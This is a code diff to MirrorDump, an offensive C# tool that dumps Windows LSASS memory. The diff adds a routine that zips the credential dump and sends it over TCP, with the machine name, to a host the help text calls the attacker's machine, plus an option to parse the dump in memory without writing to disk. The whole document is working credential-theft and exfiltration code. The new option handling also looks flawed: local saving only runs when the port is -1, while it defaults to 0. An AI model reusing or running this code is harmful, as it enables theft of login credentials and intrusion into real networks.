@@ -4,7 +4,10 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
 using static MirrorDump.MiniDumpToMem;
 using static MirrorDump.ProcessUtility;
 using static MirrorDump.WinAPI;
@@ -32,8 +35,47 @@ namespace MirrorDump {
                     }
                 }
             }
-        } 
-        
+        }
+
+        static void SendZip(string host, int port, DumpContext dc)
+        {
+            using (var outStream = new MemoryStream())
+            {
+                using (var archive = new ZipArchive(outStream, ZipArchiveMode.Create, true))
+                {
+                    var lsassDump = archive.CreateEntry($"{Guid.NewGuid()}.bin");
+                    using (var entryStream = lsassDump.Open())
+                    {
+                        using (var dumpCompressStream = new MemoryStream(dc.Data))
+                        {
+                            dumpCompressStream.CopyTo(entryStream);
+                        }
+                    }
+                }
+
+                byte[] compressedBytes = outStream.ToArray();
+
+                Console.WriteLine($"[+] Minidump successfully packed in memory, size {Math.Round(compressedBytes.Length / 1024.0 / 1024.0, 2)} MB");
+
+                byte[] zipHashBytes = MD5.Create().ComputeHash(compressedBytes);
+                string zipHash = BitConverter.ToString(zipHashBytes).Replace("-", "");
+
+                Console.WriteLine($"[*] MD5: {zipHash}");
+
+                using (var tcpClient = new TcpClient(host, port))
+                {
+                    using (var netStream = tcpClient.GetStream())
+                    {
+                        string hostName = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
+                        string zipSize = (compressedBytes.Length).ToString();
+                        byte[] stage = Encoding.ASCII.GetBytes($"{hostName}|{zipSize}");
+                        netStream.Write(stage, 0, stage.Length);
+                        netStream.Write(compressedBytes, 0, compressedBytes.Length);
+                    }
+                }
+            }
+        }
+
         static ProcessHandle FindLsassHandle() {
             var procHandles = ProcessUtility.GetProcessHandles(Process.GetCurrentProcess());
             foreach (var procHandle in procHandles) {
@@ -46,16 +88,21 @@ namespace MirrorDump {
 
         static void Main(string[] args) {
 
-            int pid = 0;
             uint limit = 0;
             string fileName = "lsass.zip";
             string dllName = "LsaProviderDuper.dll";
+            string host = "";
+            int port = 0;
+            bool parse = false;
             bool showHelp = false;
 
             OptionSet option_set = new OptionSet()
                  .Add("f=|filename=", "Output path for generated zip file", v => fileName = v)
                  .Add("d=|dllName", "Output LSA DLL name", v => dllName = v)
                  .Add("l=|limit=", "The maximum amount of memory the minidump is allowed to consume", v => limit = uint.Parse(v))
+                 .Add("host=", "IP or a hostname of the attacker's machine (if specified the dump will be sent to attacker over TCP)", v => host = v)
+                 .Add("port=", "Port number for the minidump to be sent to (must be used with --host option)", v => port = int.Parse(v))
+                 .Add("p|parse", "Parse the minidump online without touching the disk (uses https://github.com/cube0x0/MiniDump)", v => parse = v != null)
                  .Add("h|help", "Display this help", v => showHelp = v != null);
 
             try {
@@ -120,8 +167,35 @@ namespace MirrorDump {
             CloseHandle(procHandle.Handle);
             MiniDumpToMem.ShutdownHookEngine();
 
-            SaveZip(fileName, MiniDumpToMem.GetDumpContextFromHandle(MagicHandle));
-            Console.WriteLine($"[+] Minidump compressed and saved to {fileName}");             
+            //Get the dump contents
+            DumpContext dc = MiniDumpToMem.GetDumpContextFromHandle(MagicHandle);
+
+            //Now we can parse the dump live (may not work on some systems)
+            if (parse)
+            {
+                Console.WriteLine("[*] Parsing minidump...");
+                Minidump.Program.Main(dc.Data);
+            }
+            //Save the zip locally
+            else if (port == -1)
+            {
+                SaveZip(fileName, dc);
+                Console.WriteLine($"[+] Minidump saved to {fileName}");
+            }
+            //Or send it over TCP
+            else
+            {
+                try
+                {
+                    SendZip(host, port, dc);
+                    Console.WriteLine($"[+] Minidump sent to {host}:{port}");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[-] Error sending data: {ex.Message}");
+                    Console.WriteLine(ex.StackTrace);
+                }
+            }
         }
     }
 }
